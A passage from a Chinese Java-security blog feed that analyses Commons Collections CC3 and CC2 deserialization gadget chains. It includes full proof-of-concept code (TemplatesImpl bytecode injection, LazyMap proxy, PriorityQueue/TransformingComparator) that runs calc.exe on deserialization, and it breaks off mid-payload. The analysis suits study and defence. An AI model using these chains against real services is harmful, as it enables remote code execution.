class_">ObjectInputStream</span>(b2);</span><br><span class="line">        in.readObject();</span><br><span class="line">        in.close();</span><br><span class="line">        b2.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="根据-LazyMap-利用链完成调用"><a href="#根据-LazyMap-利用链完成调用" class="headerlink" title="根据 LazyMap 利用链完成调用"></a>根据 LazyMap 利用链完成调用</h3><p>直接给出最终的反序列化 POC：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.sec.cc3;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line">        <span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line">        <span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line">        <span class="keyword">import</span> javassist.CtClass;</span><br><span class="line">        <span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line">        <span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">        <span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line">        <span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">        <span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line">        <span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line">        <span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line">        <span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line">        <span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line">        <span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line">        <span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line">        <span class="keyword">import</span> java.util.HashMap;</span><br><span class="line">        <span class="keyword">import</span> java.util.Map;</span><br><span class="line">        <span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC3_LazyMap</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 通过 JAVAssist 创建一个名为 evilClass 的类,</span></span><br><span class="line"><span class="comment">         * 在该类中添加一个 static&#123;&#125; 静态块,</span></span><br><span class="line"><span class="comment">         * 并设置父类为 AbstractTranslet</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;evilClass&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc.exe\&quot;);&quot;</span>;</span><br><span class="line">        cc.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line">        <span class="comment">/* 将 evilClass 类转换成字节码 */</span></span><br><span class="line">        <span class="type">byte</span>[] evilClassBytes = cc.toBytecode();</span><br><span class="line">        <span class="type">byte</span>[][] evilByteCodes = <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;evilClassBytes&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 获取一个 TemplatesImpl 类的实例对象,</span></span><br><span class="line"><span class="comment">         * 并通过反射将对象中的 _bytecodes 属性设为恶意类 evilClass 的字节码数组,</span></span><br><span class="line"><span class="comment">         * 并保证 _name 属性的值不为 null</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesImpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_bytecodes</span> <span class="operator">=</span> templatesImpl.getClass().getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_name</span> <span class="operator">=</span> templatesImpl.getClass().getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        _bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _name.set(templatesImpl, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">        _bytecodes.set(templatesImpl, evilByteCodes);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 通过 InstantiateTransformer 实例化 TrAXFilter 类, 并通过 TrAXFilter 类的构造方法实现 TemplatesImpl.newTransformer() 方法的调用 */</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templatesImpl&#125;</span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        innerMap.put(<span class="string">&quot;key&quot;</span>, <span class="string">&quot;value&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">confunc</span> <span class="operator">=</span> cls.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        confunc.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">AIHObject</span> <span class="operator">=</span> (InvocationHandler) confunc.newInstance(Retention.class, outerMap);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(outerMap.getClass().getClassLoader(), outerMap.getClass().getInterfaces(), AIHObject);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">AIHObjectFinal</span> <span class="operator">=</span> (InvocationHandler) confunc.newInstance(Retention.class, proxyMap);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">b1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(b1);</span><br><span class="line">        out.writeObject(AIHObjectFinal);</span><br><span class="line">        out.close();</span><br><span class="line">        b1.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(b1.toString());</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">b2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(b1.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(b2);</span><br><span class="line">        in.readObject();</span><br><span class="line">        in.close();</span><br><span class="line">        b2.close();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>反序列化时弹出计算器</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220604213954505-709958500.png" alt="image-20220604213953177"></p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://mp.weixin.qq.com/s/GgBHP0ZrA_73ELK_QLJWuA">https://mp.weixin.qq.com/s/GgBHP0ZrA_73ELK_QLJWuA</a></p><p><a href="https://www.cnblogs.com/nice0e3/p/13854098.html">https://www.cnblogs.com/nice0e3/p/13854098.html</a></p>]]></content>
    
    
    <summary type="html">&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;/&gt;

&lt;p&gt;cc3链可以说是cc1和cc2链的结合，下面进行分析。&lt;/p&gt;</summary>
    
    
    
    <category term="Java安全" scheme="https://kpa1on.github.io/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="cc链" scheme="https://kpa1on.github.io/tags/cc%E9%93%BE/"/>
    
  </entry>
  
  <entry>
    <title>Java安全之Commons Collections2分析</title>
    <link href="https://kpa1on.github.io/2022/04/28/Java%E5%AE%89%E5%85%A8%E4%B9%8BCommons-Collections2%E5%88%86%E6%9E%90/"/>
    <id>https://kpa1on.github.io/2022/04/28/Java%E5%AE%89%E5%85%A8%E4%B9%8BCommons-Collections2%E5%88%86%E6%9E%90/</id>
    <published>2022-04-28T13:49:24.000Z</published>
    <updated>2022-04-28T17:19:12.238Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>之前分析了cc1的利用链，但是cc1的利用链是有JDK版本限制的。在JDK8u71版本以后，对<code>AnnotationInvocationHandler</code>的<code>readobject</code>进行了改写，导致高版本中利用链无法使用，这在上文中分析过了。</p><span id="more"></span><p>cc2链中使用的是<code>commons-collections-4.0</code>版本，利用链如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">ObjectInputStream.readObject()</span><br><span class="line">PriorityQueue.readObject()</span><br><span class="line">...</span><br><span class="line">TransformingComparator.compare()</span><br><span class="line">InvokerTransformer.transform()</span><br><span class="line">Method.invoke()</span><br><span class="line">Runtime.exec()</span><br></pre></td></tr></table></figure><p>这里cc2链使用<code>commons-collections-4.0</code>版本的原因是，在3.2.1版本以下<code>TransformingComparator</code>并没有去实现<code>Serializable</code>接口，也就是不可以被序列化的，所以在利用链上就不能使用它去构造。</p><p>3.2.1版本</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220428220627968-329694528.png" alt="image-20220428220626101"></p><p>4,0版本</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220428220713185-1097329589.png" alt="image-20220428220712646"></p><p>在CC2链里不是利用 <code>AnnotationInvocationHandler</code>来构造，而是使用</p><p> <code>javassist</code>和<code>PriorityQueue</code>来构造利用链，所以先来了解下<code>PriorityQueue</code>的基本使用。</p><h3 id="PriorityQueue"><a href="#PriorityQueue" class="headerlink" title="PriorityQueue"></a>PriorityQueue</h3><p><strong>概念</strong></p><p><code>PriorityQueue</code> 一个基于优先级的无界优先级队列。优先级队列的元素按照其自然顺序进行排序，或者根据构造队列时提供的 Comparator 进行排序，具体取决于所使用的构造方法。该队列不允许使用 null 元素也不允许插入不可比较的对象(没有实现Comparable接口的对象)。<br> <code>PriorityQueue</code> 队列的头指排序规则最小那个元素。如果多个元素都是最小值则随机选一个。<br> <code>PriorityQueue</code> 是一个无界队列，但是初始的容量(实际是一个Object[])，随着不断向优先级队列添加元素，其容量会自动扩容，无需指定容量增加策略的细节。</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220428221232439-651517910.png" alt="image-20220428221231819"></p><p><strong>构造方法</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PriorityQueue()           </span><br><span class="line">使用默认的初始容量（<span class="number">11</span>）创建一个 PriorityQueue，并根据其自然顺序对元素进行排序。</span><br><span class="line">PriorityQueue(<span class="type">int</span> initialCapacity)</span><br><span class="line">使用指定的初始容量创建一个 PriorityQueue，并根据其自然顺序对元素进行排序。</span><br></pre></td></tr></table></figure><p><strong>常见方法</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">add(E e)           将指定的元素插入此优先级队列</span><br><span class="line">clear()            从此优先级队列中移除所有元素。</span><br><span class="line">comparator()       返回用来对此队列中的元素进行排序的比较器；如果此队列根据其元素的自然顺序进行排序，则返回 null</span><br><span class="line">contains(Object o)          如果此队列包含指定的元素，则返回 true。</span><br><span class="line">iterator()           返回在此队列中的元素上进行迭代的迭代器。</span><br><span class="line">offer(E e)           将指定的元素插入此优先级队列</span><br><span class="line">peek()           获取但不移除此队列的头；如果此队列为空，则返回 null。</span><br><span class="line">poll()           获取并移除此队列的头，如果此队列为空，则返回 null。</span><br><span class="line">remove(Object o)           从此队列中移除指定元素的单个实例（如果存在）。</span><br><span class="line">size()           返回此 collection 中的元素数。</span><br><span class="line">toArray()          返回一个包含此队列所有元素的数组。</span><br></pre></td></tr></table></figure><p>代码实例</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PriorityQueueTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        PriorityQueue&lt;String&gt; q = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;String&gt;();</span><br><span class="line">        <span class="comment">//入列</span></span><br><span class="line">        q.add(<span class="string">&quot;2&quot;</span>);</span><br><span class="line">        q.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        q.add(<span class="string">&quot;5&quot;</span>);</span><br><span class="line">        q.add(<span class="string">&quot;3&quot;</span>);</span><br><span class="line">        q.add(<span class="string">&quot;4&quot;</span>);</span><br><span class="line">        <span class="comment">//出列</span></span><br><span class="line">        System.out.println(q.poll());  <span class="comment">//1</span></span><br><span class="line">        System.out.println(q.poll());  <span class="comment">//2</span></span><br><span class="line">        System.out.println(q.poll());  <span class="comment">//3</span></span><br><span class="line">        System.out.println(q.poll());  <span class="comment">//4</span></span><br><span class="line">        System.out.println(q.poll());  <span class="comment">//5</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220428221648706-1933465245.png" alt="image-20220428221648204"></p><p>观察打印结果， 入列：21534， 出列是12345， 也是说出列时做了相关判断，将最小的值返回。默认情况下<code>PriorityQueue</code>使用自然排序法，最小元素先出列。</p><h3 id="TransformingComparator"><a href="#TransformingComparator" class="headerlink" title="TransformingComparator"></a>TransformingComparator</h3><p><code>TransformingComparator</code>是一个修饰器，和CC1中的<code>ChainedTransformer</code>类似。</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220428221854229-2119926089.png" alt="image-20220428221853556">这个类有个compare()方法，会调用<code>Transformer#transform()</code>方法，根据前面的学习，猜测这里可能存在利用点，那具体该怎么利用呢，是否真的可以利用呢，下面开始分析。</p><h3 id="TransformingComparator-compare"><a href="#TransformingComparator-compare" class="headerlink" title="TransformingComparator.compare()"></a>TransformingComparator.compare()</h3><p><code>org.apache.commons.collections4.comparators.TransformingComparator</code> 类中提供了 <code>compare()</code> 方法，在该方法中对 <code>this.transformer</code> 调用了 <code>transform()</code> 方法，如果this.<code>transformer</code>可控，那么就可以利用该方法执行 <code>ChainedTransformer.transform()</code> 方法，并进入之前构造好的 <code>java.lang.Runtime.getRuntime().exec()</code> 调用链。</p><p>那现在查看下this.<code>transformer</code>是如何被赋值的。</p><p>在<code>TransformingComparator</code>的构造方法中，看到了赋值情况，并且两个构造方法都是被public关键字修饰的</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220428222500655-713162557.png" alt="image-20220428222500043"></p><p>也就是说，<code>this.transformer</code> 完全可控，我们可以将 <code>this.transformer</code> 指向 <code>ChainedTransformer</code> 对象来执行 <code>ChainedTransformer.transform()</code> 方法。</p><p>测试代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TransformingComparatorTest1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class, Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Object.class, Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;calc.exe&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformerChain);</span><br><span class="line">        transformingComparator.compare(<span class="string">&quot;test&quot;</span>,<span class="string">&quot;test&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220428222751860-78428661.png" alt="image-20220428222750807"></p><p>成功弹出计算器，但是可以看到控制台报错了</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220428222855641-1124003305.png" alt="image-20220428222855008"></p><p>根据报错信息，可以大致推断应该是类型转换有问题，而且运行的时候是先弹出计算器，后报错的，所以在下面的代码处打上断点</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220428223103501-833443309.png" alt="image-20220428223102363"></p><p>进入<code>compare()</code>方法</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220428223235512-1407610559.png" alt="image-20220428223235001"></p><p>这里的<code>transformer</code>被赋值为<code>ChainedTransformer</code>，然后调用<code>trasnform()</code>方法弹出计算器，所以我们重点就看函数的最后一行代码</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220428223451589-1296639309.png" alt="image-20220428223451003"></p><p>进入，在方法的注释中可以看到异常的信息说明，大致就是如果传入的参数不实现<code>Comparable</code>可就会产生这个报错。</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220428223653410-1966169796.png" alt="image-20220428223652822"></p><p>在这也看到，使用了泛型来约束传入的类型</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220428223811906-1530593051.png" alt="image-20220428223811362"></p><p>报错原因找到了之后，但上述的代码只是手动调用compare()方法弹出计算器，那现在如何使 <code>TransformingComparator.compare()</code> 方法自动调用呢？我们在 Java 内置的 <code>PriorityQueue</code> 类中找到了一条可行的路子。</p><h3 id="PriorityQueue-readObject"><a href="#PriorityQueue-readObject" class="headerlink" title="PriorityQueue.readObject()"></a>PriorityQueue.readObject()</h3><p><code>PriorityQueue</code> 类的 <code>readObject()</code> 方法中调用了一个 <code>heapify()</code> 方法</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220428224041906-2006646584.png" alt="image-20220428224041303"></p><h3 id="PriorityQueue-heapify"><a href="#PriorityQueue-heapify" class="headerlink" title="PriorityQueue.heapify()"></a>PriorityQueue.heapify()</h3><p>跟进 <code>heapify()</code> 方法，发现其调用了 <code>siftDown()</code> 方法，这里存在一个for循环，要想进入循环需要满足i &#x3D; (size &gt;&gt;&gt; 1) - 1 &gt;&#x3D; 0，即 <code>size &gt;= 2</code>，这里的size指的是队列中元素的个数。</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220428224139339-1220977299.png" alt="image-20220428224138782"></p><h3 id="PriorityQueue-siftDown"><a href="#PriorityQueue-siftDown" class="headerlink" title="PriorityQueue.siftDown()"></a>PriorityQueue.siftDown()</h3><p>跟进 <code>siftDown()</code> 方法，发现如果 <code>comparator</code> 变量不为空，将调用 <code>siftDownUsingComparator()</code> 方法：</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220428224410518-1285744807.png" alt="image-20220428224409958"></p><h3 id="PriorityQueue-siftDownUsingComparator"><a href="#PriorityQueue-siftDownUsingComparator" class="headerlink" title="PriorityQueue.siftDownUsingComparator()"></a>PriorityQueue.siftDownUsingComparator()</h3><p>跟进 <code>siftDownUsingComparator()</code> 方法，发现会调用 <code>comparator#compare()</code> 方法</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220428224546472-1478230969.png" alt="image-20220428224545847"></p><p>结合前面的<code>compare()</code>方法的利用，如果<code>comparator</code>可控的话，让它指向前文中构造的 <code>TransformingComparator</code> 对象，那么就可以执 <code>TransformingComparator.compare()</code> 方法了。那么，找一下<code>comparator</code>是怎么被赋值的。</p><p>查看 <code>PriorityQueue</code> 类的构造方法，其第 1 个参数用于指定队列的初始容量，第 2 个参数将赋值给 <code>this.comparator</code>，并且该构造方法对外开放，因此 <code>comparator</code> 变量完全可控</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220428230103959-1884903828.png" alt="image-20220428230103189"></p><p>构造payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">package cc2;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">import org.apache.commons.collections4.Transformer;</span><br><span class="line">import org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line">import org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line">import java.io.*;</span><br><span class="line">import java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line">public class TransformingComparatorTest2 &#123;</span><br><span class="line">    public static void main(String[] args) throws IOException, ClassNotFoundException &#123;</span><br><span class="line">        Transformer[] transformers = &#123;</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                new InvokerTransformer(</span><br><span class="line">                        &quot;getMethod&quot;,</span><br><span class="line">//                    new Class[] &#123;String.class, Class[].class&#125;,</span><br><span class="line">                        new Class[] &#123;String.class, Class[].class&#125;,</span><br><span class="line">                        new Object[]&#123;&quot;getRuntime&quot;, null&#125;</span><br><span class="line">                ),</span><br><span class="line">                new InvokerTransformer(</span><br><span class="line">                        &quot;invoke&quot;,</span><br><span class="line">                        new Class[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">                        new Object[]&#123;null, null&#125;</span><br><span class="line">                ),</span><br><span class="line">                new InvokerTransformer(</span><br><span class="line">                        &quot;exec&quot;,</span><br><span class="line">                        new Class[]&#123;String.class&#125;,</span><br><span class="line">                        new Object[]&#123;&quot;calc.exe&quot;&#125;</span><br><span class="line">                )</span><br><span class="line"></span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br><span class="line">        TransformingComparator transformingComparator = new TransformingComparator(chainedTransformer);</span><br><span class="line">//      transformingComparer.compare(&quot;test&quot;, &quot;test&quot;);</span><br><span class="line"></span><br><span class="line">        PriorityQueue priorityQueue = new PriorityQueue(2, transformingComparator);</span><br><span class="line">        priorityQueue.add(1);</span><br><span class="line">        priorityQueue.add(2);</span><br><span class="line">        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(priorityQueue);</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line">        byteArrayOutputStream.close();</span><br><span 